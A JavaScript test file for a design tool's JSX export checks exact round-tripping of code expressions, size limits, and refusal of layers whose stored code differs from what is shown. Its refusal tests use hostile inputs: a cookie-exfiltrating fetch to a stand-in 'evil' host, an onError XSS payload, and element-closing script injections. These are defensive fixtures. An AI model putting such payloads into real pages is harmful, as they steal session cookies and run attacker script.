import test from "node:test";
import assert from "node:assert/strict";

import { buildCodeIr, designToCode } from "../packages/code-ir/src/index.ts";
import { textLayerOf } from "../packages/document-model/src/index.mjs";
import { exportJsx, importJsx } from "../packages/studio-host/src/code.ts";

// #361: a {…} child of imported code is code. Export writes its exact source, never literal
// text, and refuses whatever it cannot write exactly.

const imported = (source, options) => {
  const { operations, frameId } = importJsx(source, options);
  const nodes = {};
  for (const node of operations[0].nodes) nodes[node.id] = { children: [], ...node };
  return { document: { id: "d", revision: 0, rootIds: [frameId], nodes }, rootId: operations[0].nodes[1].id };
};
const wrap = (jsx) => `export function A() {\n  return (\n    ${jsx}\n  );\n}\n`;
const exportOf = (source, options) => {
  const { document, rootId } = imported(source, options);
  return exportJsx(document, rootId).code;
};
const longCall = `{format(${Array.from({ length: 60 }, (_, index) => `value${index}`).join(",   ")})}`;

test("an expression exports as its exact source, in every place a child can be", () => {
  for (const [jsx, expected] of [
    ["<p>{title}</p>", "<p>{title}</p>"],
    ["<p>{a}{b}</p>", "<p>{a}{b}</p>"],
    ["<p>Hello {name}!</p>", "<p>{\"Hello \"}{name}!</p>"],
    ["<p>{...rest}</p>", "<p>{...rest}</p>"],
    ["<p>{/* note */ value}</p>", "<p>{/* note */ value}</p>"],
    ["<div>{items.map((item) => <li key={item}>{item}</li>)}</div>", "<div>{items.map((item) => <li key={item}>{item}</li>)}</div>"],
    // Whitespace inside a template literal is the program's, not the display's.
    ["<p>{`  two   spaces\n  line`}</p>", "<p>{`  two   spaces\n  line`}</p>"],
    // Longer than the shortened copy the canvas shows.
    [`<p>${longCall}</p>`, `<p>${longCall}</p>`],
    ["<p>Hi <b>you</b> {name}</p>", "<p>\n      {\"Hi \"}\n      <b>you</b>\n      {\" \"}\n      {name}\n    </p>"],
  ]) {
    assert.equal(exportOf(`export function A() { return ${jsx}; }`), wrap(expected), jsx);
    assert.equal(exportOf(`export function A() { return ${jsx}; }`, { bind: true, path: "A.tsx" }), wrap(expected), `${jsx}, bound`);
  }
});

test("what looks like an expression but is words stays words", () => {
  for (const jsx of ["<p>&#123;literal&#125;</p>", "<p>{'{literal}'}</p>"]) {
    assert.equal(exportOf(`export function A() { return ${jsx}; }`), wrap("<p>&#123;literal&#125;</p>"), jsx);
  }
  const typed = { id: "d", revision: 0, rootIds: ["p"], nodes: {
    p: { id: "p", type: "element", parentId: null, children: ["t"], props: { tag: "p" }, metadata: {} },
    t: { id: "t", type: "text", parentId: "p", children: [], props: { text: "{title}" }, metadata: {} },
  } };
  assert.match(exportJsx(typed, "p").code, /<p>&#123;title&#125;<\/p>/u, "braces a person typed are not code");
});

test("export reads back: the code parses, and adjacent runs keep their words", () => {
  for (const jsx of ["<p>{title}</p>", "<p>Hi <b>you</b> {name}</p>", "<p>{`a\n  b`}</p>", "<p>&nbsp;x&nbsp;<b>y</b></p>", "<ul>{items.map((item) => <li>{item}</li>)}</ul>"]) {
    assert.ok(buildCodeIr([{ path: "A.tsx", content: exportOf(`export function A() { return ${jsx}; }`) }]).rootIds.length === 1, jsx);
  }
  // Two runs beside an element: no space where the line break is.
  const adjacent = exportOf("export function A() { return <p>a{\"b\"}<b>c</b></p>; }");
  assert.match(adjacent, /<span>a<\/span>\s+<span>b<\/span>\s+<b>c<\/b>/u);
  // A run with a no-break space at its edge is a literal, which every JSX parser keeps.
  assert.match(exportOf("export function A() { return <p>&nbsp;x<b>y</b></p>; }"), /\{"\u00a0x"\}/u);
});

test("the result counts the code parts, and a document cannot make the export take long", () => {
  const counted = imported("export function A() { return <p>{a} and {b}</p>; }");
  assert.equal(exportJsx(counted.document, counted.rootId).codeParts, 2);
  const none = imported("export function A() { return <p>words</p>; }");
  assert.equal(exportJsx(none.document, none.rootId).codeParts, 0);
  // Over the bound in total, each under what one source file can hold.
  const big = `{f("${"x".repeat(200 * 1024)}")}`;
  const shown = `{${"f(\"" + "x".repeat(10)}}`;
  const nodes = { p: { id: "p", type: "element", parentId: null, children: [], props: { tag: "p" }, metadata: {} } };
  for (let index = 0; index < 6; index += 1) {
    nodes[`t${index}`] = { id: `t${index}`, type: "text", parentId: "p", children: [], props: { text: shown, codeExpression: big }, metadata: {} };
    nodes.p.children.push(`t${index}`);
  }
  assert.throws(() => exportJsx({ id: "d", revision: 0, rootIds: ["p"], nodes }, "p"), (error) => error.code === "export-too-large" || error.code === "export-refused");
});

test("export is a fixed point: bringing exported code in again exports the same code", () => {
  for (const jsx of ["<p>{title}</p>", "<p>Hello {name}!</p>", "<p>Hi <b>you</b> {name}</p>", "<ul>{items.map((item) => <li>{item}</li>)}</ul>", `<p>${longCall}</p>`]) {
    const once = exportOf(`export function A() { return ${jsx}; }`);
    assert.equal(exportOf(once), once, jsx);
  }
});

test("a part that is styled, or exported alone, keeps the element the canvas draws", () => {
  const { document, rootId } = imported("export function A() { return <p>{title}</p>; }");
  const part = document.nodes[rootId].children[0];
  assert.match(exportJsx(document, part).code, /<\w+>\{title\}<\/\w+>/u, "the root of a component must be an element");
  document.nodes[part].props.style = { color: "red" };
  assert.match(exportJsx(document, rootId).code, /<p>\s*<\w+ style="color: red">\{title\}<\/\w+>\s*<\/p>/u);
});

test("a part that cannot be written exactly refuses the export", () => {
  const refused = (mutate, pattern) => {
    const { document, rootId } = imported("export function A() { return <p>{title}</p>; }");
    mutate(document.nodes[document.nodes[rootId].children[0]]);
    assert.throws(() => exportJsx(document, rootId), (error) => error.code === "export-refused" && pattern.test(error.message));
  };
  refused((layer) => { layer.props.text = "Now words"; }, /is not the code this layer holds, \{title\}/u);
  // Bound before the exact source was recorded: the display copy is not the code.
  refused((layer) => { delete layer.props.codeExpression; layer.props.codeSource = { tag: "#expression", code: ["{title}"] }; }, /is not recorded/u);
  refused((layer) => { layer.props.codeExpression = { source: "{title}", shown: "{title}" }; }, /is not recorded/u);
  // A document that shows one thing and holds another does not export what nobody saw.
  refused((layer) => { layer.props.codeExpression = "{(fetch('//evil?'+document.cookie),title)}"; }, /is not the code this layer holds/u);
  refused((layer) => { layer.props.text = "Hello"; layer.props.codeExpression = "{<img src='x' onError={()=>alert(1)}/>}"; }, /is not the code this layer holds/u);
  // A document that claims more than one child, or closes the element, writes none of it.
  for (const source of ["{a}</p><script>evil()</script><p>{b}", "{a}</>;evil();<>{b}", "{a}</>; } function q() { return <>{b}", "{a}{b}", "{a} text", "text", "{\"words\"}", "{/* none */}", "{a", "", "{await load()}"]) {
    refused((layer) => { layer.props.codeExpression = source; }, /\{…\} part/u);
  }
  // Await is not valid in the plain function export writes; inside an async function of its own it is.
  assert.throws(() => exportOf("export async function A() { return <p>{await load()}</p>; }"), (error) => error.code === "export-refused");
  assert.equal(exportOf("export function A() { return <p>{(async () => await x)()}</p>; }"), wrap("<p>{(async () => await x)()}</p>"));
});

test("the design normal form takes a part only as a child, and only as itself", () => {
  const code = (child) => designToCode({ componentName: "A", root: { tag: "p", props: {}, children: [child] } });
  assert.match(code({ tag: "#expression", props: {}, code: "{a}" }), /<p>\{a\}<\/p>/u);
  assert.match(code({ tag: "#text", props: {}, text: "a" }), /<p>a<\/p>/u);
  assert.throws(() => designToCode({ componentName: "A", root: { tag: "#expression", props: {}, code: "{a}" } }), /unsupported field code/u);
  assert.throws(() => code({ tag: "#expression", props: { id: "x" }, code: "{a}" }), /props must be empty/u);
  assert.throws(() => code({ tag: "#expression", props: {} }), /must be a bounded string/u);
  assert.throws(() => code({ tag: "#expression", props: {}, code: "{a}", text: "b" }), /text/u);
  assert.throws(() => code({ tag: "#expression", props: {}, code: `{"${"x".repeat(256 * 1024)}"}` }), /must be a bounded string/u);
  assert.throws(() => code({ tag: "#expression", props: {}, code: "{'\ud800'}" }), /lone surrogate/u);
});

test("a pasted part is code, not an element's words, the same as a bound one", () => {
  for (const options of [{}, { bind: true, path: "A.tsx" }]) {
    const { document, rootId } = imported("export function A() { return <p>{title}</p>; }", options);
    assert.equal(textLayerOf(document, rootId), null);
  }
});
